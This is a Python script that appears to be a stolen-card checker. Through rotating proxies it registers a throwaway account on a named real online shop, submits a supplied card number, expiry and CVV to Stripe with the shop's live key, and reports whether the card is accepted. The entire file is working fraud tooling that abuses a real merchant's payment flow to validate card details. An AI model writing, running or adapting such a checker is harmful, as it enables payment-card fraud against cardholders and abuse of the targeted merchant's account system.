import requests, random, string, uuid
import httpx
from proxy import proxies_aiohttp

def getstr(data, first, end):
    try:
        start = data.index(first) + len(first)
        end = data.index(end, start)
        return data[start:end]
    except:
        return None

def generate_email():
    domain = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'protonmail.com', 'zoho.com', 'yandex.com', 'gmx.com', 'icloud.com', 'mail.com', 'inbox.com', 'gmx.us', 'gmx.de', 'gmx.net', 'gmx.co.uk', 'gmx.fr', 'gmx.at', 'gmx.ch', 'gmx.eu']
    longitud = random.randint(8, 12)
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(domain)
    return correo

async def mau(cc, mm, yy, cvv):
    max_retry = 5
    proxy = await proxies_aiohttp()

    async with httpx.AsyncClient(proxies=proxy if isinstance(proxy, dict) else None, timeout=20) as r:
        email = generate_email()
        reg_nonce = None

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        # Step 1: Get the registration nonce
        attempts = 0
        while attempts < max_retry:
            try:
                response = await r.get('https://bivianodirect.com.au/my-account/', headers=headers)
                reg_nonce = getstr(response.text, 'woocommerce-register-nonce" value="', '"')
                if reg_nonce:
                    break
            except (httpx.NetworkError, httpx.ConnectTimeout, httpx.ReadTimeout, httpx.ProxyError):
                attempts += 1
                continue

        if not reg_nonce:
            return '[MAU] => Error: 1st request failed after retries.'

        # Step 2: Register the account
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://bivianodirect.com.au',
            'Referer': 'https://bivianodirect.com.au/my-account/',
        })

        data = {
            'email': email,
            'mailchimp_woocommerce_newsletter': '1',
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        attempts = 0
        while attempts < max_retry:
            try:
                response = await r.post('https://bivianodirect.com.au/my-account/', headers=headers, data=data)
                break
            except (httpx.NetworkError, httpx.ConnectTimeout, httpx.ReadTimeout, httpx.ProxyError):
                attempts += 1
                continue

        if response.status_code != 200:
            return '[MAU] => Error: 2nd request failed.'

        # Step 3: Get the add card nonce
        headers.update({
            'Referer': 'https://bivianodirect.com.au/my-account/payment-methods/',
        })

        attempts = 0
        while attempts < max_retry:
            try:
                response = await r.get('https://bivianodirect.com.au/my-account/add-payment-method/', headers=headers)
                add_card_nonce = getstr(response.text, '"add_card_nonce":"', '"').strip()
                if add_card_nonce:
                    break
            except (httpx.NetworkError, httpx.ConnectTimeout, httpx.ReadTimeout, httpx.ProxyError):
                attempts += 1
                continue

        if not add_card_nonce:
            return '[MAU] => Error: 3rd request failed after retries.'

        # Step 4: Create Stripe source
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        stripe_data = {
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'referrer': 'https://bivianodirect.com.au',
            'type': 'card',
            'owner[name]': ' ',
            'owner[email]': email,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/69c9d75b7b; stripe-js-v3/69c9d75b7b; card-element',
            'key': 'pk_live_gh3wa9ob8TAc596aJNztzT7r00yUkP1DJ6'
        }

        attempts = 0
        while attempts < max_retry:
            try:
                response = await r.post('https://api.stripe.com/v1/sources', headers=stripe_headers, data=stripe_data)
                if response.status_code == 200:
                    src_id = response.json().get('id')
                    if src_id:
                        break
            except (httpx.NetworkError, httpx.ConnectTimeout, httpx.ReadTimeout, httpx.ProxyError):
                attempts += 1
                continue

        if not src_id:
            return '[MAU] => Error: 4th request failed.'

        # Step 5: Add payment method
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://bivianodirect.com.au/my-account/add-payment-method/',
        })

        data = {
            'stripe_source_id': src_id,
            'nonce': add_card_nonce,
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
            'elementor_page_id': '1214',
        }

        attempts = 0
        while attempts < max_retry:
            try:
                response = await r.post('https://bivianodirect.com.au/', params=params, headers=headers, data=data)
                resp_json = response.json()
                if resp_json.get('status') == 'error':
                    return resp_json['error']['message']
                elif resp_json.get('status') == 'success':
                    return 'Succeeded'
                elif 'require_action' in resp_json:
                    return '3D Secure Required'
                else:
                    return 'Unknown error'
            except (httpx.NetworkError, httpx.ConnectTimeout, httpx.ReadTimeout, httpx.ProxyError):
                attempts += 1
                continue

        return '[MAU] => Final request failed after retries.'
